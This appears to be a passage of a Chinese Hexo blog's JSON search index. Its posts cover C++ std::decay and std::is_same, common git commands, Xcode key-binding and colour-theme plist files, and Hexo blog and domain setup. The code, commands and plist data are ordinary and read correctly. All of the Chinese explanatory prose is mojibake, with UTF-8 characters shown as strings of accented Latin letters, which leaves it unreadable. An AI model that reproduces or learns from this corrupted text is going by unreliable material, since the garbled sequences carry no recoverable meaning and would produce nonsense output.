std::remove_reference<T>::type U;\npublic:\n    typedef typename std::conditional< \n        std::is_array<U>::value,\n        typename std::remove_extent<U>::type*,\n        typename std::conditional< \n            std::is_function<U>::value,\n            typename std::add_pointer<U>::type,\n            typename std::remove_cv<U>::type\n        >::type\n    >::type type;\n};\n```\nçœ‹ç€æ¯”è¾ƒæŠ½è±¡ï¼Œå…¶å®å°±æ˜¯æŠŠå„ç§å¼•ç”¨å•Šä»€ä¹ˆçš„ä¿®é¥°å»æ‰ï¼ŒæŠŠcosnt int&é€€åŒ–ä¸ºintï¼Œè¿™æ ·å°±èƒ½é€šè¿‡std::is_sameæ­£ç¡®è¯†åˆ«å‡ºåŠ äº†å¼•ç”¨çš„ç±»å‹äº† \nä¸Šé¢çš„ä¾‹å­æ”¹ä¸ºï¼š\n\n```cpp\n#include <iostream>\n#include <type_traits>\n\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n\n    typeCheck<int>(a);//int type\n    typeCheck<const int&>(b);//int type\n    typeCheck<int &>(c);//int type\n    typeCheck<const int&>(d[7]);//int type\n    typeCheck(8);//int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<typename std::decay<TYPE>::type,int>::value)//c++11\n    //if(std::is_same<std::decay_t<TYPE>, int>::value)//c++14\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\"<<std::endl;\n    }\n}\n```\n\nåœ¨cpprefæœ‰ä¸ªæ›´åŠ è¯¦ç»†çš„ä¾‹å­ï¼š\n\n```cpp\n#include <iostream>\n#include <type_traits>\n\ntemplate <typename T, typename U>\nstruct decay_equiv : \n    std::is_same<typename std::decay<T>::type, U>::type \n{};\n\nint main()\n{\n    std::cout << std::boolalpha\n              << decay_equiv<int, int>::value << '\\n'\n              << decay_equiv<int&, int>::value << '\\n'\n              << decay_equiv<int&&, int>::value << '\\n'\n              << decay_equiv<const int&, int>::value << '\\n'\n              << decay_equiv<int[2], int*>::value << '\\n'\n              << decay_equiv<int(int), int(*)(int)>::value << '\\n';\n}\n```\n\nè¾“å‡º:\n\n```cpp\ntrue\ntrue\ntrue\ntrue\ntrue\ntrue\n```\n\n## æ€»ç»“ï¼š\n+ åœ¨æ¨¡æ¿é‡Œå¯ä»¥é€šè¿‡std::is_sameåˆ¤æ–­æ¨¡æ¿çš„ç±»å‹ï¼Œä»è€Œå®ç°å¯¹ä¸åŒç±»å‹çš„åŒºåˆ«å¯¹å¾…\n\n+ åœ¨å †ç±»å‹è¦æ±‚ä¸æ˜¯éå¸¸ä¸¥æ ¼çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨std::decayæŠŠç±»å‹é€€åŒ–ä¸ºåŸºæœ¬å½¢æ€ï¼Œç»“åˆstd::is_sameç”¨ï¼Œå¯ä»¥åˆ¤æ–­å‡ºæ›´å¤šçš„æƒ…å†µ\n","tags":["c++"],"categories":["c++"]},{"title":"gitå®ç”¨æ“ä½œæ€»ç»“","url":"%2Fp%2F42eae4e7.html","content":"\n### gitçš„é…ç½®\n1. å®‰è£…git\n2. å®‰è£…å®Œæˆåï¼Œéœ€è¦è®¾ç½®è‡ªå·±çš„ç”¨æˆ·åå’Œemailï¼Œåœ¨å‘½ä»¤è¡Œè¾“å…¥ï¼š\n\n```bash\ngit config --global user.name \"levon\"\ngit config --global user.email \"levonfly@gmail.com\"\n```\n\n### gitå’Œç›®å½•ç»‘å®š\n1. åœ¨ä¸€ä¸ªç›®å½•é‡Œå¯ä»¥é€šè¿‡git initå‘½ä»¤æŠŠè¿™ä¸ªç›®å½•å˜æˆGitå¯ä»¥ç®¡ç†çš„ä»“åº“,ç„¶åé€šè¿‡ä»¥ä¸‹å‘½ä»¤ç»‘å®šæäº¤çš„åœ°å€\n\n```bash\ngit remote add origin https://github.com/unix2dos/unix2dos.github.io\n```\n\n2. git clone åœ°å€ å°±ä¼šåˆ›å»ºç›®å½•å’Œåœ°å€ç»‘å®š\n<!-- more -->\n\n### gitçš„åŸºç¡€æ“ä½œ\n1. å‘½ä»¤git add \t      æŠŠæ–‡ä»¶æ·»åŠ åˆ°ä»“åº“\n2. å‘½ä»¤git commit \t  æŠŠæ–‡ä»¶æäº¤åˆ°ä»“åº“\n3. å‘½ä»¤git pull \t  æŠŠè¿œç¨‹ä»“åº“æ‹‰å–æ–‡ä»¶\n4. å‘½ä»¤git push       æŠŠæ–‡ä»¶æäº¤åˆ°è¿œç¨‹ä»“åº“\n5. å‘½ä»¤git log \t      æŸ¥çœ‹gitæäº¤æ—¥å¿—\n6. å¦‚æœå«Œè¾“å‡ºä¿¡æ¯å¤ªå¤š, å¯ä»¥åŠ ä¸Š--pretty=onelineå‚æ•°. å¦å¤–ä¹Ÿå¯ä»¥èŠ±å¼logè¾“å‡º, git lgæŸ¥çœ‹ä¸‹\n\n\t```bash\n\tgit config --global alias.lg \"log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit --date=relative\"\n\t```\n7. å‘½ä»¤git diff æŸ¥çœ‹ç‰ˆæœ¬ä¹‹é—´æ–‡ä»¶ä¿®æ”¹å˜åŒ–\n\n\t```bash\n\tgit diff 87b91b6 f9b3075 [--name-only]åŠ ä¸Šå¯ä»¥åªçœ‹æ–‡ä»¶åå­—\n\t```\n\n### git å›æ»šç‰ˆæœ¬\nåœ¨Gitä¸­ï¼Œç”¨HEADè¡¨ç¤ºå½“å‰ç‰ˆæœ¬,ä¸Šä¸€ä¸ªç‰ˆæœ¬å°±æ˜¯HEAD^,ä¸Šä¸Šä¸€ä¸ªç‰ˆæœ¬å°±æ˜¯HEAD^^,å½“ç„¶å¾€ä¸Š100ä¸ªç‰ˆæœ¬å†™100ä¸ª^æ¯”è¾ƒå®¹æ˜“æ•°ä¸è¿‡æ¥ï¼Œæ‰€ä»¥å†™æˆHEAD~100ã€‚\n\n1. å›æ»šåˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬\n```bash\ngit reset --hard HEAD^\n```\n2. å›æ»šåˆ°ä»»æ„ä¸€ä¸ªç‰ˆæœ¬\n```bash\ngit reset --hard ç‰ˆæœ¬å·(é€šè¿‡git logæŸ¥çœ‹)\n```\n3. å¦‚æœgitå›æ»šåˆ°å†å²ç‰ˆæœ¬å, git logåªèƒ½çœ‹å†å²ç‰ˆæœ¬å†ä»¥å‰çš„ç‰ˆæœ¬å·, ä¸åˆ°æœªæ¥çš„ç‰ˆæœ¬å·æ€ä¹ˆåŠ?\n>git æä¾›äº†ä¸€ä¸ªå‘½ä»¤git reflogç”¨æ¥è®°å½•ä½ çš„æ¯ä¸€æ¬¡å‘½ä»¤\n\n\n\n### gitå›æ»šæ–‡ä»¶\n+ æŸ¥çœ‹æ–‡ä»¶çš„ä¿®æ”¹è®°å½•\n\n```bash\ngit log config.h\n```\n+ æŸ¥çœ‹æ–‡ä»¶ç‰ˆæœ¬çš„å·®åˆ«\n\n```bash\ngit diff a3551 fd681 config.h\n```\n+  å›é€€åˆ°æŒ‡å®šçš„ç‰ˆæœ¬\n\n```bash\ngit reset fd681 config.h\n```\n+  æäº¤åˆ°æœ¬åœ°å‚è€ƒ\n\n```bash\ngit commit -m \"revert old file because commmit have a bug\"   \n```\n+ æ›´æ–°åˆ°å·¥ä½œç›®å½•\n\n```bash\ngit checkout config.h   \n```\n+ æäº¤åˆ°è¿œç¨‹ä»“åº“\n\n```bash\ngit push origin master  \n```\n\n\n### gitæ’¤é”€æ“ä½œ\n\n+ gitä¿®æ”¹æ–‡ä»¶å, è¿˜æ²¡æœ‰add, commit.  è¿™æ—¶æ’¤é”€æ–‡ä»¶ä¿®æ”¹, å³å›åˆ°ä¸Šä¸€ç‰ˆæœ¬çš„å†…å®¹\n\n```bash\ngit checkout -- file\n```\nå‘½ä»¤ä¸­çš„--å¾ˆé‡è¦ï¼Œæ²¡æœ‰--ï¼Œå°±å˜æˆäº†â€œåˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯â€çš„å‘½ä»¤ï¼Œæˆ‘ä»¬åœ¨åé¢çš„åˆ†æ”¯ç®¡ç†ä¸­ä¼šå†æ¬¡é‡åˆ°git checkoutå‘½ä»¤ã€‚\n\n+ git add æ–‡ä»¶åæ’¤é”€addæ“ä½œ\n\n```bash\ngit reset HEAD file\n```\n\n### gitè§£å†³å†²çª\n\n1. å»ºè®®æ‰‹åŠ¨è§£å†³å†²çª\n\n2. å‘½ä»¤è¡Œå¯ä»¥ä½¿ç”¨åˆ«äººæˆ–è‡ªå·±çš„ç‰ˆæœ¬\n\n```bash\ngit checkout --theirs/--ours  file\n```\n\n### gitå…¨å±€é…ç½®\n\n+ ä¸­æ–‡ä¸å†æ˜¾ç¤º8è¿›åˆ¶  git statusæ˜¾ç¤ºä¸­æ–‡\n\n```bash\ngit config --global core.quotepath false\n```\n\n+ è®¾ç½®ä»£ç†, å› ä¸ºå›½å†…ä¸€äº›åŸå› ä¸‹è½½çš„å¾ˆæ…¢\n\n```bash\ngit config --global http.proxy 'localhost:8123'\ngit config --global --unset http.proxy\n```\n\n+ gitåŒºåˆ†æ–‡ä»¶å¤§å°å†™\n\ngité»˜è®¤ä¸åŒºåˆ†æ–‡ä»¶å¤§å°å†™,å¯¼è‡´æ–‡ä»¶åæ”¹äº†ä»¥ågitçŠ¶æ€æ²¡æœ‰æ”¹å˜,éœ€è¦è®¾ç½®ä¸€ä¸‹\n\n```\ngit config core.ignorecase false\n```\n\n\n### git åˆ†æ”¯æ“ä½œ\næŸ¥çœ‹åˆ†æ”¯ï¼šgit branch\n\nåˆ›å»ºåˆ†æ”¯ï¼šgit branch <name>\n\nåˆ‡æ¢åˆ†æ”¯ï¼šgit checkout <name>\n\nåˆ›å»º+åˆ‡æ¢åˆ†æ”¯ï¼šgit checkout -b <name>\n\nåˆå¹¶æŸåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯ï¼šgit merge <name>\n\nåˆ é™¤åˆ†æ”¯ï¼šgit branch -d <name>\n\n\n### git æ ‡ç­¾æ“ä½œ\n\nå‘½ä»¤git tag <name>ç”¨äºæ–°å»ºä¸€ä¸ªæ ‡ç­¾ï¼Œé»˜è®¤ä¸ºHEADï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªcommit idï¼›\n\ngit tag -a <tagname> -m \"blablabla...\"å¯ä»¥æŒ‡å®šæ ‡ç­¾ä¿¡æ¯ï¼›\n\ngit tag -s <tagname> -m \"blablabla...\"å¯ä»¥ç”¨PGPç­¾åæ ‡ç­¾ï¼›\n\nå‘½ä»¤git tagå¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾ã€‚\n\nå‘½ä»¤git push origin <tagname>å¯ä»¥æ¨é€ä¸€ä¸ªæœ¬åœ°æ ‡ç­¾ï¼›\n\nå‘½ä»¤git push origin --tagså¯ä»¥æ¨é€å…¨éƒ¨æœªæ¨é€è¿‡çš„æœ¬åœ°æ ‡ç­¾ï¼›\n\nå‘½ä»¤git tag -d <tagname>å¯ä»¥åˆ é™¤ä¸€ä¸ªæœ¬åœ°æ ‡ç­¾ï¼›\n\nå‘½ä»¤git push origin :refs/tags/<tagname>å¯ä»¥åˆ é™¤ä¸€ä¸ªè¿œç¨‹æ ‡ç­¾ã€‚\n\n\n### git åˆå¹¶ commit\n\n```\ngit rebase -i \"åˆå¹¶å‰ä¸€ä¸ªç‰ˆæœ¬å·\"// åˆå¹¶å‰ä¸€ä¸ª ç‰ˆæœ¬å·\n\n\tpick æ˜¯ç”¨commit\n\tsquash æ˜¯åˆå¹¶å‰ä¸€ä¸ª\n\n:wq é€€å‡ºä¿®æ”¹åˆå¹¶åçš„ commit log\n\ngit rebase --abort å¦‚æœå‡ºç°å¤±è¯¯æ¥æ’¤é”€\n```\n\n\n### github forkåæ›´æ–°æºä»“åº“çš„ä»£ç \n\n```bash\ngit remote add upstream https://github.com/golang/go\ngit remote -v\ngit fetch upstream\ngit merge upstream/master\n```\n\n### git å¢åŠ  è¿œç¨‹ä»“åº“ orgin(åå­—ä¸ä¸€æ ·)\n\n```\ngit remote add github git@github.com:unix2dos/dht.git\ngit push github master\n```\n\n### git åˆ†æ”¯ä¿®æ”¹åå­—\n\n```\ngit branch -m åŸå æ–°å\n```\n\n\n### gitæ’¤é”€æ“ä½œ\n\n+ git push åæ’¤é”€\n\n```\ngit revert <hash> \n```\n\n+ commitæ¶ˆæ¯æ’¤é”€\n\n```\ngit commit --amend -m 'æ–°çš„æ¶ˆæ¯'\n```\n+ å›æ»šæ–‡ä»¶çš„æ”¹åŠ¨(æœªæœ‰commit) \n\n```\ngit checkout -- <filename>\n```\n+ å›æ»šç‰ˆæœ¬\n\n```\ngit reset --hard <hash>  (--hardå¼ºåˆ¶å†…å®¹å›å½’,å¦‚æœä¿®æ”¹å†…å®¹ä¿ç•™ä¸åŠ æ­¤é€‰é¡¹)\n```\n\n+ åœæ­¢è¿½è¸ªä¸€ä¸ªæ–‡ä»¶\n\nä½ å¶ç„¶æŠŠapplication.logåŠ åˆ°ä»£ç åº“é‡Œäº†ï¼Œç°åœ¨æ¯æ¬¡ä½ è¿è¡Œåº”ç”¨ï¼ŒGitéƒ½ä¼šæŠ¥å‘Šåœ¨application.logé‡Œæœ‰æœªæäº¤çš„ä¿®æ”¹ã€‚ä½ æŠŠ *.logæ”¾åˆ°äº†.gitignoreæ–‡ä»¶é‡Œï¼Œå¯æ–‡ä»¶è¿˜æ˜¯åœ¨ä»£ç åº“é‡Œï¼Œä½ æ€æ ·æ‰èƒ½è®©Gitâ€œæ’¤é”€â€å¯¹è¿™ä¸ªæ–‡ä»¶çš„è¿½è¸ªå‘¢ï¼Ÿ\n\n```\ngit rm --cached application.log\n```\n\n\n### git lg å®Œç¾æ˜¾ç¤º\n\n```\ngit config --global alias.lg \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit\"\n```","tags":["git"],"categories":["git"]},{"title":"xcodeè‡ªå®šä¹‰Eclipseä¸­å¸¸ç”¨çš„å¿«æ·é”®","url":"%2Fp%2F30321ed4.html","content":"\n\n\né¦–å…ˆæ‰¾åˆ°Xcodeä¸­çš„è‡ªå¸¦çš„é…ç½®æ–‡ä»¶\n\n```\n/Applications/Xcode.app/Contents/Frameworks/IDEKit.framework/Versions/A/Resources/IDETextKeyBindingSet.plist\n```\nè¿™ä¸ªæ–‡ä»¶é‡Œé…ç½®äº†ä¸€äº›å¯ä»¥è®¾ç½®å¿«æ·é”®çš„æ“ä½œ, ä½¿ç”¨å¸¸ç”¨çš„ç¼–è¾‘å™¨æ‰“å¼€å®ƒï¼ˆéœ€è¦rootæƒé™ï¼‰ã€‚\n\n```\n\t<key>GDI Commands</key>\n\t<dict>\n\t\t<key>GDI Duplicate Current Line</key>\n\t\t<string>selectLine:, copy:, moveToEndOfLine:, insertNewline:, paste:, deleteBackward:</string>\n\t\t<key>GDI Delete Current Line</key>\n\t\t<string>deleteToBeginningOfLine:, moveToEndOfLine:, deleteToBeginningOfLine:, deleteBackward:, moveDown:, moveToBeginningOfLine:</string>\n\t\t<key>GDI Move Current Line Up</key>\n\t\t<string>selectLine:, cut:, moveUp:, moveToBeginningOfLine:, insertNewLine:, paste:, moveBackward:</string>\n\t\t<key>GDI Move Current Line Down</key>\n\t\t<string>selectLine:, cut:, moveDown:, moveToBeginningOfLine:, insertNewLine:, paste:, moveBackward:</string>\n\t\t<key>GDI Insert Line Above</key>\n\t\t<string>moveUp:, moveToEndOfLine:, insertNewline:</string>\n\t\t<key>GDI Insert Line Below</key>\n\t\t<string>moveToEndOfLine:, insertNewline:</string>\n\t</dict>\n```\n<!-- more -->\næŠŠè¿™æ®µé…ç½®æ”¾åˆ°ä¸Šé¢æåˆ°çš„IDETextKeyBindingSet.plisté‡Œï¼Œæ”¾åœ¨æ–‡ä»¶çš„æœ€åçš„è¿™ä¸¤è¡Œä¹‹å‰ï¼š\n</dict>\n</plist>\n\né‡å¯Xcodeï¼Œåœ¨Xcodeèœå•ä¸­ï¼Œæ‰“å¼€Preferencesï¼Œé€‰ä¸­Key Bindingï¼Œåœ¨å³ä¸Šæ–¹æœç´¢GDI, ä¼šå‡ºç°ç±»ä¼¼ä¸‹å›¾çš„æ˜¾ç¤ºï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œè¯·æ£€æŸ¥ä¸Šé¢çš„æ¯æ­¥æ“ä½œã€‚\n\n","tags":["xcode"],"categories":["è½¯ä»¶"]},{"title":"xcodeä¸»é¢˜","url":"%2Fp%2Fb884c3b7.html","content":"\n\n\n### Xcode ä¸»é¢˜\n\n```\nhttps://github.com/tursunovic/xcode-themes\n```\n\n### elfDark\n\n```\nhttps://code.google.com/archive/p/elf-ios-resource/downloads\n\ncd /Users/liuwei/Library/Developer/Xcode/UserData/FontAndColorThemes æ”¾è¿›å»\n```\n\n\n<!-- more -->\n\n### cat ElfDark.xccolortheme\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>DVTConsoleDebuggerInputTextColor</key>\n\t<string>1 0.986905 0.947622 1</string>\n\t<key>DVTConsoleDebuggerInputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleDebuggerOutputTextColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleDebuggerOutputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleDebuggerPromptTextColor</key>\n\t<string>1 0.036325 0.0717013 1</string>\n\t<key>DVTConsoleDebuggerPromptTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleExectuableInputTextColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleExectuableInputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleExectuableOutputTextColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTConsoleExectuableOutputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleTextBackgroundColor</key>\n\t<string>0.109 0.109 0.109 1</string>\n\t<key>DVTConsoleTextInsertionPointColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleTextSelectionColor</key>\n\t<string>0.416 0.869 1 1</string>\n\t<key>DVTDebuggerInstructionPointerColor</key>\n\t<string>0.705792 0.8 0.544 1</string>\n\t<key>DVTMarkupTextBackgroundColor</key>\n\t<string>0.145 0.145 0.145 1</string>\n\t<key>DVTMarkupTextBorderColor</key>\n\t<string>0.2134 0.2134 0.2134 1</string>\n\t<key>DVTMarkupTextCodeFont</key>\n\t<string>SFMono-Regular - 13.0</string>\n\t<key>DVTMarkupTextEmphasisColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextEmphasisFont</key>\n\t<string>.AppleSystemUIFontItalic - 13.0</string>\n\t<key>DVTMarkupTextInlineCodeColor</key>\n\t<string>1 1 1 0.7</string>\n\t<key>DVTMarkupTextLinkColor</key>\n\t<string>0.192442 0.469436 0.928 1</string>\n\t<key>DVTMarkupTextLinkFont</key>\n\t<string>.AppleSystemUIFont - 13.0</string>\n\t<key>DVTMarkupTextNormalColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextNormalFont</key>\n\t<string>.AppleSystemUIFont - 13.0</string>\n\t<key>DVTMarkupTextOtherHeadingColor</key>\n\t<string>1 1 1 0.5</string>\n\t<key>DVTMarkupTextOtherHeadingFont</key>\n\t<string>.AppleSystemUIFont - 18.2</string>\n\t<key>DVTMarkupTextPrimaryHeadingColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextPrimaryHeadingFont</key>\n\t<string>.AppleSystemUIFont - 31.2</string>\n\t<key>DVTMarkupTextSecondaryHeadingColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextSecondaryHeadingFont</key>\n\t<string>.AppleSystemUIFont - 23.4</string>\n\t<key>DVTMarkupTextStrongColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextStrongFont</key>\n\t<string>.AppleSystemUIFontBold - 13.0</string>\n\t<key>DVTSourceTextBackground</key>\n\t<string>0.0706522 0.0706522 0.0706522 1</string>\n\t<key>DVTSourceTextBlockDimBackgroundColor</key>\n\t<string>0.109 0.109 0.109 1</string>\n\t<key>DVTSourceTextCurrentLineHighlightColor</key>\n\t<string>0.0609167 0.0946952 0.138587 1</string>\n\t<key>DVTSourceTextInsertionPointColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTSourceTextInvisiblesColor</key>\n\t<string>0.137973 0.380435 0.195417 1</string>\n\t<key>DVTSourceTextSelectionColor</key>\n\t<string>0.0317101 0.166824 0.342391 1</string>\n\t<key>DVTSourceTextSyntaxColors</key>\n\t<dict>\n\t\t<key>xcode.syntax.attribute</key>\n\t\t<string>1 0.904 0.984 1</string>\n\t\t<key>xcode.syntax.character</key>\n\t\t<string>0.921429 0.70068 0.169311 1</string>\n\t\t<key>xcode.syntax.comment</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.comment.doc</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.comment.doc.keyword</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.identifier.class</key>\n\t\t<string>0.355 0.922 0.986 1</string>\n\t\t<key>xcode.syntax.identifier.class.system</key>\n\t\t<string>0.229 0.721 0.887 1</string>\n\t\t<key>xcode.syntax.identifier.constant</key>\n\t\t<string>0.228 0.718 0.882 1</string>\n\t\t<key>xcode.syntax.identifier.constant.system</key>\n\t\t<string>0.228 0.718 0.882 1</string>\n\t\t<key>xcode.syntax.identifier.function</key>\n\t\t<string>0.248 0.78 0.959 1</string>\n\t\t<key>xcode.syntax.identifier.function.system</key>\n\t\t<string>0.227 0.714 0.878 1</string>\n\t\t<key>xcode.syntax.identifier.macro</key>\n\t\t<string>0.218579 0.6826 0.839759 1</string>\n\t\t<key>xcode.syntax.identifier.macro.system</key>\n\t\t<string>0.467 0.881 1 1</string>\n\t\t<key>xcode.syntax.identifier.type</key>\n\t\t<string>0.229 0.721 0.887 1</string>\n\t\t<key>xcode.syntax.identifier.type.system</key>\n\t\t<string>0.222 0.699 0.86 1</string>\n\t\t<key>xcode.syntax.identifier.variable</key>\n\t\t<string>0.23 0.725 0.891 1</string>\n\t\t<key>xcode.syntax.identifier.variable.system</key>\n\t\t<string>0.225 0.707 0.869 1</string>\n\t\t<key>xcode.syntax.keyword</key>\n\t\t<string>1 0.11 0.157 1</string>\n\t\t<key>xcode.syntax.number</key>\n\t\t<string>0.341 0.923 0.326 1</string>\n\t\t<key>xcode.syntax.plain</key>\n\t\t<string>1 1 1 1</string>\n\t\t<key>xcode.syntax.preprocessor</key>\n\t\t<string>0.18956 0.673603 0.983696 1</string>\n\t\t<key>xcode.syntax.string</key>\n\t\t<string>1 0.761311 0.178664 1</string>\n\t\t<key>xcode.syntax.url</key>\n\t\t<string>0.192442 0.469436 0.928 1</string>\n\t</dict>\n\t<key>DVTSourceTextSyntaxFonts</key>\n\t<dict>\n\t\t<key>xcode.syntax.attribute</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.character</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment.doc</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment.doc.keyword</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.class</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.class.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.constant</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.constant.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.function</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.function.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.macro</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.macro.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.type</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.type.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.variable</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.variable.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.keyword</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.number</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.plain</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.preprocessor</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.string</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.url</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t</dict>\n</dict>\n</plist>\n```","tags":["xcode"],"categories":["è½¯ä»¶"]},{"title":"hexoæ­å»ºåšå®¢","url":"%2Fp%2Fb37651.html","content":"\n# 1. å®‰è£…hexo\n\n+ å®‰è£…node.js\n+ å®‰è£…hexo\n\n\t```\n\tnpm install -g hexo-cli\n\tmkdir hexo\n\thexo init hexo\n\tcd hexo\n\t```\n\n<!-- more -->\n\n# 2. hexoé…ç½®\n\n+ å› ä¸ºä¸»ç«™æœ‰ä¸ªé…ç½®, ä¸»é¢˜ä¹Ÿæœ‰ä¸ªé…ç½®, å»ºè®®ä¸¤ä¸ªé…ç½®åˆå¹¶ä¸€èµ·, éœ€è¦Hexoç‰ˆæœ¬åœ¨ 3 ä»¥ä¸Š\n\n+ åœ¨ç«™ç‚¹çš„ `source/_data` ç›®å½•ä¸‹æ–°å»º `next.yml` æ–‡ä»¶ï¼ˆ`_data`ç›®å½•å¯èƒ½éœ€è¦æ–°å»ºï¼‰è¿ç§»ç«™ç‚¹é…ç½®æ–‡ä»¶å’Œä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­çš„é…ç½®åˆ° `next.yml` ä¸­(åŒ…å«äº†`_config.yml`å’Œ`theme.yml`)\n  \n\t```\n\thexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n\t```\n\t\n+ ä¸æ¸²æŸ“ README\n\n  å°†skip_renderå‚æ•°çš„å€¼è®¾ç½®ä¸Šã€‚skip_render: README.md\n  ä½¿ç”¨hexo d å‘½ä»¤å°±ä¸ä¼šåœ¨æ¸²æŸ“ README.md è¿™ä¸ªæ–‡ä»¶äº†ã€‚\n\n\n\n# 3. ç»‘å®šåŸŸå\n\n+ ä¸ºè‡ªå·±çš„ github ç”Ÿæˆä¸€ä¸ªå…¬é’¥ç§é’¥å¯¹\n\n+ å»ºç«‹å¸¦ç”¨æˆ·åçš„ä»“åº“ unix2dos.github.io\n\n- CNAME æ”¾åˆ° source æ–‡ä»¶å¤¹, é‡Œé¢å†™ä¸Š www.liuvv.com\n- å‘ä½ çš„ DNS é…ç½®ä¸­æ·»åŠ  3 æ¡è®°å½•\n\n```\n@          A             192.30.252.153\n@          A             192.30.252.154\nwww      CNAME           unix2dos.github.io.\n```\n\n\n\n# 4. hexoæ’ä»¶\n\n```shell\nnpm install hexo --save\nnpm install hexo-deployer-git --save\n\nnpm ls --depth 0  //æŸ¥çœ‹ä¸¢å¤±çš„åŒ…\nnpm install hexo-generator-archive --save //é€ä¸€å®‰è£…ç¼ºå¤±çš„åŒ…\n\n\n### hexo-next ä¸»é¢˜\n\n# ç¬¬ä¸€å°ç”µè„‘\ncd themes\ngit submodule add https://github.com/unix2dos/hexo-theme-next next\ncd next\n\n# ç¬¬äºŒå°ç”µè„‘\ngit submodule update --init\ncd themes/next\n\n# åˆ†äº«æŒ‰é’®\ngit clone https://github.com/theme-next/theme-next-needmoreshare2 source/lib/needsharebutton  \n\n# ä¸å¸¦\ngit clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon\n\n# èœ˜è››ç½‘\ngit clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest\n\n# ä¸‰ç§ç‰¹æ•ˆ\ngit clone https://github.com/theme-next/theme-next-three source/lib/three \n\n# ç‰¹æ®Šæ±‰å­—\ngit clone https://github.com/theme-next/theme-next-han source/lib/Han\n\n# å¿«é€Ÿç‚¹å‡»\ngit clone https://github.com/theme-next/theme-next-fastclick source/lib/fastclick\n\n# æ‡’åŠ è½½\ngit clone https://github.com/theme-next/theme-next-jquery-lazyload source/lib/jquery_lazyload\n\n# é¡¶éƒ¨çš„è¿›åº¦\ngit clone https://github.com/theme-next/theme-next-pace source/lib/pace \n\n# å›¾ç‰‡å±•ç¤º\ngit clone https://github.com/theme-next/theme-next-fancybox3 source/lib/fancybox 